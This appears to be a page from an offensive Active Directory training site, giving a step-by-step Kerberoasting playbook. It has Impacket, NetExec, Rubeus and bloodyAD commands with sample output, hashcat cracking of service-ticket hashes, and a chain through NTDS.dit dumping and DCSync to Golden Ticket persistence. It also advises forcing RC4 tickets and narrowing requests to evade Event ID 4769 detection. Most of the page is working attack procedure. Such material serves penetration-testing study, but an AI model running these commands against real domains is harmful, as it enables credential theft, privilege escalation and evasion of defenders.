---
layout: default
title: "Kerberoasting"
order: 3
phase: "CRED"
tactic: "Credential Access"
summary: "Request TGS tickets for accounts with SPNs and crack the service account passwords offline — the workhorse of AD credential access."
---

{% include ad_nav.html %}

# Kerberoasting

## Pre-requisites

<div class="badges">
  <span class="badge req">ANY valid domain credential (user or hash)</span>
  <span class="badge req">TCP 88 to the DC</span>
  <span class="badge req">Target accounts with a registered SPN</span>
  <span class="badge req">Clock synced to DC</span>
</div>

- **Any** authenticated domain account (even the lowest-privileged user). This is the crucial difference from AS-REP Roasting.
- Network access to the KDC on port 88.
- One or more **service accounts** with a `servicePrincipalName` set (e.g. `MSSQLSvc/...`, `HTTP/...`, `CIFS/...`).

## Mechanism & Theory

Any authenticated user can request a **service ticket (TGS)** for any SPN in the domain (that is normal Kerberos behaviour). The TGS's *enc-part* is encrypted with the **NTLM hash of the service account** that owns the SPN. If the KDC issues an RC4 (etype 23) ticket, we can capture it and brute-force the service account's password offline. Service accounts frequently have weak, rarely-rotated passwords → high success rate.

```terminal
TGS-REQ (SPN=MSSQLSvc/db01.corp.local) ──► KDC
KDC ──► TGS-REP { enc-part encrypted with svc_sql's NTLM key }   ◄── crack offline
```

Hash format: `$krb5tgs$23$*user$REALM$SPN*$<checksum>$<cipher>` (23 = RC4). AES variants are `$krb5tgs$18$` / `$krb5tgs$17$`.

<div class="callout info">
  <span class="callout-title">Why it works so well</span>
  Service accounts are often provisioned once with a human-chosen password and never rotated. Combined with RC4 tickets, a single GPU rips through them quickly.
</div>

<div class="attack-diagram">
  <div class="diag-title">Kerberoasting — credential access chain</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Any domain cred</span><span class="n-tool">low-priv user</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Request TGS for SPNs</span><span class="n-tool">GetUserSPNs -request</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">TGS-REP hashes</span><span class="n-tool">$krb5tgs$23$</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Crack offline</span><span class="n-tool">hashcat -m 13100</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Service account pw</span><span class="n-tool">svc_sql</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Escalate</span><span class="n-tool">privesc / lateral</span></div>
  </div>
</div>

## Step-by-step

### 1. Enumerate SPNs & request tickets (Impacket)

```bash
export DC=10.10.10.100
export DOMAIN=corp.local

# List SPN accounts only
impacket-GetUserSPNs $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC

# Request all TGS and save hashcat-format hashes
impacket-GetUserSPNs $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC -request -outputfile kerberoast.txt
```

```terminal
ServicePrincipalName          Name       MemberOf                              PasswordLastSet
----------------------------  ---------  ------------------------------------  -------------------
MSSQLSvc/db01.corp.local:1433 svc_sql    CN=SQLAdmins,OU=Service,DC=corp,...   2022-03-01 09:14:02
HTTP/web01.corp.local         svc_web    CN=WebOps,OU=Service,DC=corp,...      2021-11-20 16:40:11
CIFS/files01.corp.local       svc_files  CN=Backup Operators,CN=Builtin,...    2020-08-02 08:00:00

[*] Getting TGS for svc_sql
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01...*$a91f...<snip>...c30d
```

### 2. NetExec / Rubeus alternatives

```bash
# NetExec
nxc ldap $DC -u m.rossi -p 'Welcome2026!' --kerberoasting kerberoast.txt

# Rubeus (from a Windows foothold) — roast everything
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap

# Rubeus, force RC4 to get crackable tickets even in AES-preferred domains
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast.txt
```

Anatomy of a Kerberoast hash — which tickets are crackable:

```terminal
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$a91f...c30d
     |    |   |        |          |                            |
     |    |   |        |          |                            +-- enc-part: TGS encrypted with svc_sql's NT key
     |    |   |        |          +-- SPN of the target service
     |    |   |        +-- REALM
     |    |   +-- service account sAMAccountName
     |    +-- etype 23 (RC4)  ->  hashcat -m 13100
     +-------- TGS-REP roast marker      (AES 17/18  ->  -m 19600 / 19700)
```

### 3. Crack offline with Hashcat

```bash
# Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerberoast.txt --show

# AES-256 tickets ($krb5tgs$18$) use mode 19700 ; AES-128 ($krb5tgs$17$) use 19600
hashcat -m 19700 kerberoast_aes.txt /usr/share/wordlists/rockyou.txt
```

```terminal
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01...*$a91f...c30d:P@ssw0rd2022
Status...........: Cracked
```

### 4. Targeted Kerberoasting (post-exploitation)

If you control an account via ACL abuse but it has **no** SPN, add one temporarily, roast, remove:

```bash
# Add a bogus SPN to a victim you have GenericWrite over, roast, then clean up
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC set object victim_user servicePrincipalName -v "fake/svc"
impacket-GetUserSPNs $DOMAIN/m.rossi:'Welcome2026!' -dc-ip $DC -request-user victim_user
bloodyAD -u m.rossi -p 'Welcome2026!' -d $DOMAIN --host $DC set object victim_user servicePrincipalName
```

## Complete Attack Chain

```terminal
[1] one valid credential (from spray / AS-REP / phish)
[2] GetUserSPNs -request     ─► TGS hashes for svc_sql, svc_web, svc_files
[3] hashcat -m 13100         ─► svc_sql : P@ssw0rd2022
[4] validate & enumerate rights
        nxc smb $DC -u svc_sql -p 'P@ssw0rd2022'   ─► (Pwn3d!) on db01?
        bloodhound: svc_files ∈ Backup Operators   ─► can read NTDS on DC!
        │
[5] escalate along the strongest edge:
        ├─ svc_files ∈ Backup Operators ─► SeBackupPrivilege ─► dump NTDS.dit ─► DCSync-equivalent
        ├─ svc_sql local admin on db01  ─► dump LSASS ─► reuse creds/tickets (Lateral Movement)
        └─ svc account has ACL over DA  ─► ACL abuse
        │
        ▼
   DCSync (krbtgt) ─► Golden Ticket ─► domain persistence
```

<div class="callout tip">
  <span class="callout-title">Backup Operators tie-in</span>
  A very common exam path: Kerberoast a service account that turns out to be in <strong>Backup Operators</strong>. That grants <code>SeBackupPrivilege</code>, letting you copy <code>NTDS.dit</code> + SYSTEM hive off the DC and extract every hash offline — a DCSync without the DCSync.
</div>

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  Each TGS request is <strong>Event ID 4769</strong>. A single account requesting many SPNs, especially with ticket-encryption-type <code>0x17</code> (RC4), is the signature. Prefer <code>/rc4opsec</code> or targeted single-SPN roasts on real engagements.
</div>

## Key Takeaways

- Only needs **one** low-priv credential → the highest-ROI credential-access technique.
- Force/prefer **RC4 (etype 23)** tickets for fast cracking.
- Cracked service accounts are frequently over-privileged (SQL admins, Backup Operators) → straight to escalation.

{% include toc_sidebar.html %}
